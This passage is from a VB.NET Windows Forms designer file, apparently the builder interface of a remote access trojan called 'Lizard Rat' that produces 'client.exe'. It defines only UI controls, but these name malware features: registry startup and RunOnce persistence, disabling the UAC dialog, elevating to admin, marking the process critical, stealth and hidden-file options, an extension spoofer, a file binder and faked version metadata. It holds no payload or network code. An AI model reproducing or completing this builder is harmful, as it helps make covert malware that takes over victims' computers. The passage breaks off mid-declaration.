        Me.GroupBox2.TabIndex = 9
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Install      "
        '
        'cmbRunOnce
        '
        Me.cmbRunOnce.FormattingEnabled = True
        Me.cmbRunOnce.Items.AddRange(New Object() {"No", "Yes", "Yes (refresh)"})
        Me.cmbRunOnce.Location = New System.Drawing.Point(162, 209)
        Me.cmbRunOnce.Name = "cmbRunOnce"
        Me.cmbRunOnce.Size = New System.Drawing.Size(121, 21)
        Me.cmbRunOnce.TabIndex = 45
        Me.cmbRunOnce.Text = "No"
        '
        'Label21
        '
        Me.Label21.AutoSize = True
        Me.Label21.Location = New System.Drawing.Point(13, 212)
        Me.Label21.Name = "Label21"
        Me.Label21.Size = New System.Drawing.Size(135, 13)
        Me.Label21.TabIndex = 44
        Me.Label21.Text = "Use RunOnce (HKCU):"
        '
        'txtstartupLM
        '
        Me.txtstartupLM.Enabled = False
        Me.txtstartupLM.Location = New System.Drawing.Point(163, 157)
        Me.txtstartupLM.Name = "txtstartupLM"
        Me.txtstartupLM.Size = New System.Drawing.Size(120, 20)
        Me.txtstartupLM.TabIndex = 43
        '
        'PictureBox13
        '
        Me.PictureBox13.Image = CType(resources.GetObject("PictureBox13.Image"), System.Drawing.Image)
        Me.PictureBox13.Location = New System.Drawing.Point(121, 157)
        Me.PictureBox13.Name = "PictureBox13"
        Me.PictureBox13.Size = New System.Drawing.Size(16, 20)
        Me.PictureBox13.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox13.TabIndex = 42
        Me.PictureBox13.TabStop = False
        '
        'chkHKLM
        '
        Me.chkHKLM.AutoSize = True
        Me.chkHKLM.Location = New System.Drawing.Point(16, 159)
        Me.chkHKLM.Name = "chkHKLM"
        Me.chkHKLM.Size = New System.Drawing.Size(133, 17)
        Me.chkHKLM.TabIndex = 41
        Me.chkHKLM.Text = "HKLM Startup (    )"
        Me.chkHKLM.UseVisualStyleBackColor = True
        '
        'chkHKCU
        '
        Me.chkHKCU.AutoSize = True
        Me.chkHKCU.Checked = True
        Me.chkHKCU.CheckState = System.Windows.Forms.CheckState.Checked
        Me.chkHKCU.Location = New System.Drawing.Point(16, 133)
        Me.chkHKCU.Name = "chkHKCU"
        Me.chkHKCU.Size = New System.Drawing.Size(105, 17)
        Me.chkHKCU.TabIndex = 40
        Me.chkHKCU.Text = "HKCU Startup"
        Me.chkHKCU.UseVisualStyleBackColor = True
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(13, 82)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(80, 13)
        Me.Label1.TabIndex = 39
        Me.Label1.Text = "Installfolder:"
        '
        'chkinstall
        '
        Me.chkinstall.AutoSize = True
        Me.chkinstall.Checked = True
        Me.chkinstall.CheckState = System.Windows.Forms.CheckState.Checked
        Me.chkinstall.Location = New System.Drawing.Point(49, 0)
        Me.chkinstall.Name = "chkinstall"
        Me.chkinstall.Size = New System.Drawing.Size(15, 14)
        Me.chkinstall.TabIndex = 38
        Me.chkinstall.UseVisualStyleBackColor = True
        '
        'PictureBox8
        '
        Me.PictureBox8.Image = CType(resources.GetObject("PictureBox8.Image"), System.Drawing.Image)
        Me.PictureBox8.Location = New System.Drawing.Point(290, 46)
        Me.PictureBox8.Name = "PictureBox8"
        Me.PictureBox8.Size = New System.Drawing.Size(16, 20)
        Me.PictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox8.TabIndex = 37
        Me.PictureBox8.TabStop = False
        '
        'PictureBox7
        '
        Me.PictureBox7.Image = CType(resources.GetObject("PictureBox7.Image"), System.Drawing.Image)
        Me.PictureBox7.Location = New System.Drawing.Point(158, 46)
        Me.PictureBox7.Name = "PictureBox7"
        Me.PictureBox7.Size = New System.Drawing.Size(16, 20)
        Me.PictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox7.TabIndex = 36
        Me.PictureBox7.TabStop = False
        '
        'Label41
        '
        Me.Label41.AutoSize = True
        Me.Label41.Location = New System.Drawing.Point(7, 22)
        Me.Label41.Name = "Label41"
        Me.Label41.Size = New System.Drawing.Size(98, 13)
        Me.Label41.TabIndex = 33
        Me.Label41.Text = "Install Location:"
        '
        'txtFolder
        '
        Me.txtFolder.Location = New System.Drawing.Point(163, 79)
        Me.txtFolder.Name = "txtFolder"
        Me.txtFolder.Size = New System.Drawing.Size(120, 20)
        Me.txtFolder.TabIndex = 31
        Me.txtFolder.Text = "Foldername"
        '
        'RadioButton3
        '
        Me.RadioButton3.AutoSize = True
        Me.RadioButton3.BackColor = System.Drawing.Color.Transparent
        Me.RadioButton3.Location = New System.Drawing.Point(188, 47)
        Me.RadioButton3.Name = "RadioButton3"
        Me.RadioButton3.Size = New System.Drawing.Size(129, 17)
        Me.RadioButton3.TabIndex = 35
        Me.RadioButton3.Text = "ProgramFiles (    )"
        Me.RadioButton3.UseVisualStyleBackColor = False
        '
        'RadioButton1
        '
        Me.RadioButton1.AutoSize = True
        Me.RadioButton1.Checked = True
        Me.RadioButton1.Location = New System.Drawing.Point(16, 47)
        Me.RadioButton1.Name = "RadioButton1"
        Me.RadioButton1.Size = New System.Drawing.Size(74, 17)
        Me.RadioButton1.TabIndex = 32
        Me.RadioButton1.TabStop = True
        Me.RadioButton1.Text = "AppData"
        Me.RadioButton1.UseVisualStyleBackColor = True
        '
        'RadioButton2
        '
        Me.RadioButton2.AutoSize = True
        Me.RadioButton2.Location = New System.Drawing.Point(91, 47)
        Me.RadioButton2.Name = "RadioButton2"
        Me.RadioButton2.Size = New System.Drawing.Size(94, 17)
        Me.RadioButton2.TabIndex = 34
        Me.RadioButton2.Text = "System(    )"
        Me.RadioButton2.UseVisualStyleBackColor = True
        '
        'Label32
        '
        Me.Label32.AutoSize = True
        Me.Label32.Location = New System.Drawing.Point(13, 186)
        Me.Label32.Name = "Label32"
        Me.Label32.Size = New System.Drawing.Size(63, 13)
        Me.Label32.TabIndex = 25
        Me.Label32.Text = "Filename:"
        '
        'txtstartup
        '
        Me.txtstartup.Location = New System.Drawing.Point(163, 131)
        Me.txtstartup.Name = "txtstartup"
        Me.txtstartup.Size = New System.Drawing.Size(120, 20)
        Me.txtstartup.TabIndex = 27
        Me.txtstartup.Text = "Lizard Rat"
        '
        'txtname
        '
        Me.txtname.Location = New System.Drawing.Point(163, 183)
        Me.txtname.Name = "txtname"
        Me.txtname.Size = New System.Drawing.Size(120, 20)
        Me.txtname.TabIndex = 24
        Me.txtname.Text = "client.exe"
        '
        'GroupBox9
        '
        Me.GroupBox9.Controls.Add(Me.PictureBox15)
        Me.GroupBox9.Controls.Add(Me.chkElevate)
        Me.GroupBox9.Controls.Add(Me.PictureBox14)
        Me.GroupBox9.Controls.Add(Me.chkUAC)
        Me.GroupBox9.Controls.Add(Me.chkcritical)
        Me.GroupBox9.Controls.Add(Me.chkpersistance)
        Me.GroupBox9.Location = New System.Drawing.Point(329, 6)
        Me.GroupBox9.Name = "GroupBox9"
        Me.GroupBox9.Size = New System.Drawing.Size(227, 159)
        Me.GroupBox9.TabIndex = 11
        Me.GroupBox9.TabStop = False
        Me.GroupBox9.Text = "Process Security"
        '
        'PictureBox15
        '
        Me.PictureBox15.Image = CType(resources.GetObject("PictureBox15.Image"), System.Drawing.Image)
        Me.PictureBox15.Location = New System.Drawing.Point(151, 120)
        Me.PictureBox15.Name = "PictureBox15"
        Me.PictureBox15.Size = New System.Drawing.Size(16, 20)
        Me.PictureBox15.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox15.TabIndex = 40
        Me.PictureBox15.TabStop = False
        '
        'chkElevate
        '
        Me.chkElevate.AutoSize = True
        Me.chkElevate.Location = New System.Drawing.Point(26, 122)
        Me.chkElevate.Name = "chkElevate"
        Me.chkElevate.Size = New System.Drawing.Size(153, 17)
        Me.chkElevate.TabIndex = 39
        Me.chkElevate.Text = "Elevate to Admin (    )"
        Me.chkElevate.UseVisualStyleBackColor = True
        '
        'PictureBox14
        '
        Me.PictureBox14.Image = CType(resources.GetObject("PictureBox14.Image"), System.Drawing.Image)
        Me.PictureBox14.Location = New System.Drawing.Point(165, 88)
        Me.PictureBox14.Name = "PictureBox14"
        Me.PictureBox14.Size = New System.Drawing.Size(16, 20)
        Me.PictureBox14.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox14.TabIndex = 38
        Me.PictureBox14.TabStop = False
        '
        'chkUAC
        '
        Me.chkUAC.AutoSize = True
        Me.chkUAC.Location = New System.Drawing.Point(26, 90)
        Me.chkUAC.Name = "chkUAC"
        Me.chkUAC.Size = New System.Drawing.Size(167, 17)
        Me.chkUAC.TabIndex = 2
        Me.chkUAC.Text = "Disable UAC Dialog (    )"
        Me.chkUAC.UseVisualStyleBackColor = True
        '
        'chkcritical
        '
        Me.chkcritical.AutoSize = True
        Me.chkcritical.Enabled = False
        Me.chkcritical.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.chkcritical.ForeColor = System.Drawing.Color.Black
        Me.chkcritical.Location = New System.Drawing.Point(26, 58)
        Me.chkcritical.Name = "chkcritical"
        Me.chkcritical.Size = New System.Drawing.Size(136, 17)
        Me.chkcritical.TabIndex = 1
        Me.chkcritical.Text = "Mark Process as critcal"
        Me.chkcritical.UseVisualStyleBackColor = True
        '
        'chkpersistance
        '
        Me.chkpersistance.AutoSize = True
        Me.chkpersistance.Enabled = False
        Me.chkpersistance.Location = New System.Drawing.Point(26, 26)
        Me.chkpersistance.Name = "chkpersistance"
        Me.chkpersistance.Size = New System.Drawing.Size(139, 17)
        Me.chkpersistance.TabIndex = 0
        Me.chkpersistance.Text = "Process Persistance"
        Me.chkpersistance.UseVisualStyleBackColor = True
        '
        'GroupBox10
        '
        Me.GroupBox10.Controls.Add(Me.chkshowhidden)
        Me.GroupBox10.Controls.Add(Me.chkStealth)
        Me.GroupBox10.Controls.Add(Me.chkHidden)
        Me.GroupBox10.Location = New System.Drawing.Point(329, 171)
        Me.GroupBox10.Name = "GroupBox10"
        Me.GroupBox10.Size = New System.Drawing.Size(227, 113)
        Me.GroupBox10.TabIndex = 12
        Me.GroupBox10.TabStop = False
        Me.GroupBox10.Text = "Stealth Options"
        '
        'chkshowhidden
        '
        Me.chkshowhidden.AutoSize = True
        Me.chkshowhidden.Location = New System.Drawing.Point(25, 84)
        Me.chkshowhidden.Name = "chkshowhidden"
        Me.chkshowhidden.Size = New System.Drawing.Size(180, 17)
        Me.chkshowhidden.TabIndex = 2
        Me.chkshowhidden.Text = "Disable ""show hidden files"""
        Me.chkshowhidden.UseVisualStyleBackColor = True
        '
        'chkStealth
        '
        Me.chkStealth.AutoSize = True
        Me.chkStealth.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.chkStealth.ForeColor = System.Drawing.Color.Red
        Me.chkStealth.Location = New System.Drawing.Point(25, 25)
        Me.chkStealth.Name = "chkStealth"
        Me.chkStealth.Size = New System.Drawing.Size(171, 17)
        Me.chkStealth.TabIndex = 1
        Me.chkStealth.Text = "Stealthmode (no Window)"
        Me.chkStealth.UseVisualStyleBackColor = True
        '
        'chkHidden
        '
        Me.chkHidden.AutoSize = True
        Me.chkHidden.Location = New System.Drawing.Point(25, 55)
        Me.chkHidden.Name = "chkHidden"
        Me.chkHidden.Size = New System.Drawing.Size(115, 17)
        Me.chkHidden.TabIndex = 0
        Me.chkHidden.Text = "Set Hidden Flag"
        Me.chkHidden.UseVisualStyleBackColor = True
        '
        'TabPage19
        '
        Me.TabPage19.Controls.Add(Me.GroupBox3)
        Me.TabPage19.Controls.Add(Me.GroupBox16)
        Me.TabPage19.Controls.Add(Me.GroupBox12)
        Me.TabPage19.Controls.Add(Me.GroupBox8)
        Me.TabPage19.Controls.Add(Me.GroupBox4)
        Me.TabPage19.Location = New System.Drawing.Point(4, 22)
        Me.TabPage19.Name = "TabPage19"
        Me.TabPage19.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage19.Size = New System.Drawing.Size(1073, 471)
        Me.TabPage19.TabIndex = 2
        Me.TabPage19.Text = "Misc"
        Me.TabPage19.UseVisualStyleBackColor = True
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.GroupBox11)
        Me.GroupBox3.Controls.Add(Me.kB)
        Me.GroupBox3.Controls.Add(Me.txtsize)
        Me.GroupBox3.Controls.Add(Me.chkpump)
        Me.GroupBox3.Location = New System.Drawing.Point(239, 82)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(227, 76)
        Me.GroupBox3.TabIndex = 10
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Misc"
        '
        'GroupBox11
        '
        Me.GroupBox11.Controls.Add(Me.imgicon)
        Me.GroupBox11.Controls.Add(Me.btnicon)
        Me.GroupBox11.Location = New System.Drawing.Point(108, 11)
        Me.GroupBox11.Name = "GroupBox11"
        Me.GroupBox11.Size = New System.Drawing.Size(113, 58)
        Me.GroupBox11.TabIndex = 10
        Me.GroupBox11.TabStop = False
        Me.GroupBox11.Text = "Icon"
        '
        'imgicon
        '
        Me.imgicon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.imgicon.Location = New System.Drawing.Point(12, 17)
        Me.imgicon.Name = "imgicon"
        Me.imgicon.Size = New System.Drawing.Size(32, 32)
        Me.imgicon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.imgicon.TabIndex = 7
        Me.imgicon.TabStop = False
        '
        'btnicon
        '
        Me.btnicon.Location = New System.Drawing.Point(70, 22)
        Me.btnicon.Name = "btnicon"
        Me.btnicon.Size = New System.Drawing.Size(26, 23)
        Me.btnicon.TabIndex = 9
        Me.btnicon.Text = "..."
        Me.btnicon.UseVisualStyleBackColor = True
        '
        'kB
        '
        Me.kB.AutoSize = True
        Me.kB.Location = New System.Drawing.Point(80, 45)
        Me.kB.Name = "kB"
        Me.kB.Size = New System.Drawing.Size(22, 13)
        Me.kB.TabIndex = 5
        Me.kB.Text = "kB"
        '
        'txtsize
        '
        Me.txtsize.Location = New System.Drawing.Point(46, 42)
        Me.txtsize.Name = "txtsize"
        Me.txtsize.Size = New System.Drawing.Size(31, 20)
        Me.txtsize.TabIndex = 4
        Me.txtsize.Text = "50"
        '
        'chkpump
        '
        Me.chkpump.AutoSize = True
        Me.chkpump.Location = New System.Drawing.Point(26, 19)
        Me.chkpump.Name = "chkpump"
        Me.chkpump.Size = New System.Drawing.Size(81, 17)
        Me.chkpump.TabIndex = 3
        Me.chkpump.Text = "Pump File"
        Me.chkpump.UseVisualStyleBackColor = True
        '
        'GroupBox16
        '
        Me.GroupBox16.Controls.Add(Me.cmbspoof)
        Me.GroupBox16.Controls.Add(Me.GroupBox17)
        Me.GroupBox16.Location = New System.Drawing.Point(6, 259)
        Me.GroupBox16.Name = "GroupBox16"
        Me.GroupBox16.Size = New System.Drawing.Size(303, 108)
        Me.GroupBox16.TabIndex = 17
        Me.GroupBox16.TabStop = False
        Me.GroupBox16.Text = "Extention Spoofer"
        '
        'cmbspoof
        '
        Me.cmbspoof.FormattingEnabled = True
        Me.cmbspoof.Items.AddRange(New Object() {"None", "7z", "aac", "bat", "bmp", "docx", "ini", "jar", "jpeg", "jpg", "m4a", "m4v", "mp3", "mp4v", "mpeg", "pdf", "ppt", "pptx", "rar", "swf", "ttf", "txt", "vbs", "wav", "wma", "wmv"})
        Me.cmbspoof.Location = New System.Drawing.Point(68, 49)
        Me.cmbspoof.Name = "cmbspoof"
        Me.cmbspoof.Size = New System.Drawing.Size(223, 21)
        Me.cmbspoof.TabIndex = 12
        Me.cmbspoof.Text = "None"
        '
        'GroupBox17
        '
        Me.GroupBox17.Controls.Add(Me.imgspoof)
        Me.GroupBox17.Location = New System.Drawing.Point(6, 26)
        Me.GroupBox17.Name = "GroupBox17"
        Me.GroupBox17.Size = New System.Drawing.Size(56, 58)
        Me.GroupBox17.TabIndex = 11
        Me.GroupBox17.TabStop = False
        Me.GroupBox17.Text = "Icon"
        '
        'imgspoof
        '
        Me.imgspoof.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.imgspoof.Location = New System.Drawing.Point(12, 17)
        Me.imgspoof.Name = "imgspoof"
        Me.imgspoof.Size = New System.Drawing.Size(32, 32)
        Me.imgspoof.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.imgspoof.TabIndex = 7
        Me.imgspoof.TabStop = False
        '
        'GroupBox12
        '
        Me.GroupBox12.Controls.Add(Me.cmdmutex)
        Me.GroupBox12.Controls.Add(Me.txtMutex)
        Me.GroupBox12.Location = New System.Drawing.Point(239, 13)
        Me.GroupBox12.Name = "GroupBox12"
        Me.GroupBox12.Size = New System.Drawing.Size(227, 55)
        Me.GroupBox12.TabIndex = 11
        Me.GroupBox12.TabStop = False
        Me.GroupBox12.Text = "Mutex"
        '
        'cmdmutex
        '
        Me.cmdmutex.Image = CType(resources.GetObject("cmdmutex.Image"), System.Drawing.Image)
        Me.cmdmutex.Location = New System.Drawing.Point(181, 19)
        Me.cmdmutex.Name = "cmdmutex"
        Me.cmdmutex.Size = New System.Drawing.Size(24, 25)
        Me.cmdmutex.TabIndex = 1
        Me.cmdmutex.UseVisualStyleBackColor = True
        '
        'txtMutex
        '
        Me.txtMutex.Location = New System.Drawing.Point(6, 22)
        Me.txtMutex.Name = "txtMutex"
        Me.txtMutex.Size = New System.Drawing.Size(169, 20)
        Me.txtMutex.TabIndex = 0
        '
        'GroupBox8
        '
        Me.GroupBox8.Controls.Add(Me.cbBind)
        Me.GroupBox8.Controls.Add(Me.txtBind)
        Me.GroupBox8.Controls.Add(Me.cmdBind)
        Me.GroupBox8.Location = New System.Drawing.Point(6, 373)
        Me.GroupBox8.Name = "GroupBox8"
        Me.GroupBox8.Size = New System.Drawing.Size(303, 92)
        Me.GroupBox8.TabIndex = 16
        Me.GroupBox8.TabStop = False
        Me.GroupBox8.Text = "Binder"
        '
        'cbBind
        '
        Me.cbBind.AutoSize = True
        Me.cbBind.Location = New System.Drawing.Point(6, 19)
        Me.cbBind.Name = "cbBind"
        Me.cbBind.Size = New System.Drawing.Size(88, 17)
        Me.cbBind.TabIndex = 2
        Me.cbBind.Text = "Use Binder"
        Me.cbBind.UseVisualStyleBackColor = True
        '
        'txtBind
        '
        Me.txtBind.Location = New System.Drawing.Point(6, 43)
        Me.txtBind.Name = "txtBind"
        Me.txtBind.Size = New System.Drawing.Size(234, 20)
        Me.txtBind.TabIndex = 1
        '
        'cmdBind
        '
        Me.cmdBind.Location = New System.Drawing.Point(246, 41)
        Me.cmdBind.Name = "cmdBind"
        Me.cmdBind.Size = New System.Drawing.Size(45, 23)
        Me.cmdBind.TabIndex = 0
        Me.cmdBind.Text = "..."
        Me.cmdBind.UseVisualStyleBackColor = True
        '
        'GroupBox4
        '
        Me.GroupBox4.Controls.Add(Me.txtVersion4)
        Me.GroupBox4.Controls.Add(Me.txtVersion3)
        Me.GroupBox4.Controls.Add(Me.txtVersion2)
        Me.GroupBox4.Controls.Add(Me.txtVersion1)
        Me.GroupBox4.Controls.Add(Me.txtFileVersion4)
        Me.GroupBox4.Controls.Add(Me.txtFileVersion3)
        Me.GroupBox4.Controls.Add(Me.txtFileVersion2)
        Me.GroupBox4.Controls.Add(Me.txtFileVersion1)
        Me.GroupBox4.Controls.Add(Me.txtTrademark)
        Me.GroupBox4.Controls.Add(Me.txtCopyright)
        Me.GroupBox4.Controls.Add(Me.txtProduct)
        Me.GroupBox4.Controls.Add(Me.txtCompany)
        Me.GroupBox4.Controls.Add(Me.txtDescription)
        Me.GroupBox4.Controls.Add(Me.txtTitle)
        Me.GroupBox4.Controls.Add(Me.Label30)
        Me.GroupBox4.Controls.Add(Me.Label29)
        Me.GroupBox4.Controls.Add(Me.Label28)
        Me.GroupBox4.Controls.Add(Me.Label27)
        Me.GroupBox4.Controls.Add(Me.Label26)
        Me.GroupBox4.Controls.Add(Me.Label25)
        Me.GroupBox4.Controls.Add(Me.Label24)
        Me.GroupBox4.Controls.Add(Me.Label23)
        Me.GroupBox4.Location = New System.Drawing.Point(6, 13)
        Me.GroupBox4.Name = "GroupBox4"
        Me.GroupBox4.Size = New System.Drawing.Size(227, 239)
        Me.GroupBox4.TabIndex = 6
        Me.GroupBox4.TabStop = False
        Me.GroupBox4.Text = "File Assembly Settings"
        '
        'txtVersion4
        '
        Me.txtVersion4.Location = New System.Drawing.Point(190, 207)
        Me.txtVersion4.Name = "txtVersion4"
        Me.txtVersion4.Size = New System.Drawing.Size(32, 20)
        Me.txtVersion4.TabIndex = 21
        Me.txtVersion4.Text = "0"
        Me.txtVersion4.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'txtVersion3
        '
        Me.txtVersion3.Location = New System.Drawing.Point(152, 207)
        Me.txtVersion3.Name = "txtVersion3"
        Me.txtVersion3.Size = New System.Drawing.Size(32, 20)
        Me.txtVersion3.TabIndex = 20
        Me.txtVersion3.Text = "0"
        Me.txtVersion3.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'txtVersion2
        '
        Me.txtVersion2.Location = New System.Drawing.Point(114, 207)
        Me.txtVersion2.Name = "txtVersion2"
        Me.txtVersion2.Size = New System.Drawing.Size(32, 20)
        Me.txtVersion2.TabIndex = 19
        Me.txtVersion2.Text = "0"
        Me.txtVersion2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'txtVersion1
        '
        Me.txtVersion1.Location = New System.Drawing.Point(76, 207)
        Me.txtVersion1.Name = "txtVersion1"
        Me.txtVersion1.Size = New System.Drawing.Size(32, 20)
        Me.txtVersion1.TabIndex = 18
        Me.txtVersion1.Text = "1"
        Me.txtVersion1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'txtFileVersion4
        '
        Me.txtFileVersion4.Location = New System.Drawing.Point(190, 181)
        Me.txtFileVersion4.Name = "txtFileVersion4"
        Me.txtFileVersion4.Size = New System.Drawing.Size(32, 20)
        Me.txtFileVersion4.TabIndex = 17
        Me.txtFileVersion4.Text = "0"
        Me.txtFileVersion4.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'txtFileVersion3
        '
        Me.txtFileVersion3.Location = New System.Drawing.Point(152, 181)
        Me.txtFileVersion3.Name = "txtFileVersion3"
        Me.txtFileVersion3.Size = New System.Drawing.Size(32, 20)
        Me.txtFileVersion3.TabIndex = 16
        Me.txtFileVersion3.Text = "0"
        Me.txtFileVersion3.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'txtFileVersion2
        '
        Me.txtFileVersion2.Location = New System.Drawing.Point(114, 181)
        Me.txtFileVersion2.Name = "txtFileVersion2"
        Me.txtFileVersion2.Size = New System.Drawing.Size(32, 20)
        Me.txtFileVersion2.TabIndex = 15
        Me.txtFileVersion2.Text = "0"
        Me.txtFileVersion2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'txtFileVersion1
        '
        Me.txtFileVersion1.Location = New System.Drawing.Point(76, 181)
        Me.txtFileVersion1.Name = "txtFileVersion1"
        Me.txtFileVersion1.Size = New System.Drawing.Size(32, 20)
        Me.txtFileVersion1.TabIndex = 14
        Me.txtFileVersion1.Text = "1"
        Me.txtFileVersion1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'txtTrademark
        '
        Me.txtTrademark.Location = New System.Drawing.Point(76, 155)
        Me.txtTrademark.Name = "txtTrademark"
        Me.txtTrademark.Size = New System.Drawing.Size(146, 20)
        Me.txtTrademark.TabIndex = 13
        '
        'txtCopyright
        '
        Me.txtCopyright.Location = New System.Drawing.Point(76, 129)
        Me.txtCopyright.Name = "txtCopyright"
        Me.txtCopyright.Size = New System.Drawing.Size(146, 20)
        Me.txtCopyright.TabIndex = 12
        '
        'txtProduct
        '
        Me.txtProduct.Location = New System.Drawing.Point(76, 103)
        Me.txtProduct.Name = "txtProduct"
        Me.txtProduct.Size = New System.Drawing.Size(146, 20)
        Me.txtProduct.TabIndex = 11
        '
        'txtCompany
        '
        Me.txtCompany.Location = New System.Drawing.Point(76, 77)
        Me.txtCompany.Name = "txtCompany"
        Me.txtCompany.Size = New System.Drawing.Size(146, 20)
        Me.txtCompany.TabIndex = 10
        '
        'txtDescription
        '
        Me.txtDescription.Location = New System.Drawing.Point(76, 51)
        Me.txtDescription.Name = "txtDescription"
        Me.txtDescription.Size = New System.Drawing.Size(146, 20)
        Me.txtDescription.TabIndex = 9
        '
        'txtTitle
        '
        Me.txtTitle.Location = New System.Drawing.Point(76, 25)
        Me.txtTitle.Name = "txtTitle"
        Me.txtTitle.Size = New System.Drawing.Size(146, 20)
        Me.txtTitle.TabIndex = 8
        '
        'Label30
        '
        Me.Label30.AutoSize = True
        Me.Label30.Location = New System.Drawing.Point(7, 210)
        Me.Label30.Name = "Label30"
        Me.Label30.Size = New System.Drawing.Size(33, 13)
        Me.Label30.TabIndex = 7
        Me.Label30.Text = "Ver.:"
        '
        'Label29
        '
        Me.Label29.AutoSize = True
        Me.Label29.Location = New System.Drawing.Point(5, 185)
        Me.Label29.Name = "Label29"
        Me.Label29.Size = New System.Drawing.Size(56, 13)
        Me.Label29.TabIndex = 6
        Me.Label29.Text = "File Ver.:"
        '
        'Label28
        '
        Me.Label28.AutoSize = True
        Me.Label28.Location = New System.Drawing.Point(5, 158)
        Me.Label28.Name = "Label28"
        Me.Label28.Size = New System.Drawing.Size(74, 13)
        Me.Label28.TabIndex = 5
        Me.Label28.Text = "Trademark:"
        '
        'Label27
        '
        Me.Label27.AutoSize = True
        Me.Label27.Location = New System.Drawing.Point(5, 132)
        Me.Label27.Name = "Label27"
        Me.Label27.Size = New System.Drawing.Size(68, 13)
        Me.Label27.TabIndex = 4
        Me.Label27.Text = "Copyright:"
        '
        'Label26
        '
        Me.Label26.AutoSize = True
        Me.Label26.Location = New System.Drawing.Point(5, 106)
        Me.Label26.Name = "Label26"
        Me.Label26.Size = New System.Drawing.Size(55, 13)
        Me.Label26.TabIndex = 3
        Me.Label26.Text = "Product:"
        '
        'Label25
        '
        Me.Label25.AutoSize = True
        Me.Label25.Location = New System.Drawing.Point(5, 80)
        Me.Label25.Name = "Label25"
        Me.Label25.Size = New System.Drawing.Size(67, 13)
        Me.Label25.TabIndex = 2
        Me.Label25.Text = "Company:"
        '
        'Label24
        '
        Me.Label24.AutoSize = True
        Me.Label24.Location = New System.Drawing.Point(5, 54)
        Me.Label24.Name = "Label24"
        Me.Label24.Size = New System.Drawing.Size(76, 13)
        Me.Label24.TabIndex = 1
        Me.Label24.Text = "Description:"
        '
        'Label23
        '
        Me.Label23.AutoSize = True
        Me.Label23.Location = New System.Drawing.Point(5, 28)
        Me.Label23.Name = "Label23"
        Me.Label23.Size = New System.Drawing.Size(36, 13)
        Me.Label23.TabIndex = 0
        Me.Label23.Text = "Title:"
        '
        'TabPage20
        '
        Me.TabPage20.Controls.Add(Me.GroupBox14)
        Me.TabPage20.Controls.Add(Me.ProgressBar1)
        Me.TabPage20.Controls.Add(Me.GroupBox15)
        Me.TabPage20.Controls.Add(Me.GroupBox13)
        Me.TabPage20.Location = New System.Drawing.Point(4, 22)
        Me.TabPage20.Name = "TabPage20"
        Me.TabPage20.Size = New System.Drawing.Size(1073, 471)
        Me.TabPage20.TabIndex = 3
        Me.TabPage20.Text = "Build"
        Me.TabPage20.UseVisualStyleBackColor = True
        '
        'GroupBox14
        '
        Me.GroupBox14.Controls.Add(Me.chkTOS)
        Me.GroupBox14.Controls.Add(Me.btnBuild)
        Me.GroupBox14.Location = New System.Drawing.Point(14, 13)
        Me.GroupBox14.Name = "GroupBox14"
        Me.GroupBox14.Size = New System.Drawing.Size(480, 72)
        Me.GroupBox14.TabIndex = 14
        Me.GroupBox14.TabStop = False
        Me.GroupBox14.Text = "Compile"
        '
        'chkTOS
        '
        Me.chkTOS.AutoSize = True
        Me.chkTOS.Location = New System.Drawing.Point(6, 49)
        Me.chkTOS.Name = "chkTOS"
        Me.chkTOS.Size = New System.Drawing.Size(143, 17)
        Me.chkTOS.TabIndex = 15
        Me.chkTOS.Text = "I agree to the T.O.S."
        Me.chkTOS.UseVisualStyleBackColor = True
        '
        'btnBuild
        '
        Me.btnBuild.Image = CType(resources.GetObject("btnBuild.Image"), System.Drawing.Image)
        Me.btnBuild.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.btnBuild.Location = New System.Drawing.Point(80, 18)
        Me.btnBuild.Name = "btnBuild"
        Me.btnBuild.Size = New System.Drawing.Size(309, 25)
        Me.btnBuild.TabIndex = 4
        Me.btnBuild.Text = "Build"
        Me.btnBuild.UseVisualStyleBackColor = True
        '
        'ProgressBar1
        '
        Me.ProgressBar1.Location = New System.Drawing.Point(14, 430)
        Me.ProgressBar1.Maximum = 38
        Me.ProgressBar1.Name = "ProgressBar1"
        Me.ProgressBar1.Size = New System.Drawing.Size(480, 31)
        Me.ProgressBar1.TabIndex = 5
        '
        'GroupBox15
        '
        Me.GroupBox15.Controls.Add(Me.lstBuild)
        Me.GroupBox15.Location = New System.Drawing.Point(14, 210)
        Me.GroupBox15.Name = "GroupBox15"
        Me.GroupBox15.Size = New System.Drawing.Size(480, 214)
        Me.GroupBox15.TabIndex = 15
        Me.GroupBox15.TabStop = False
        Me.GroupBox15.Text = "Build Log"
        '
        'lstBuild
        '
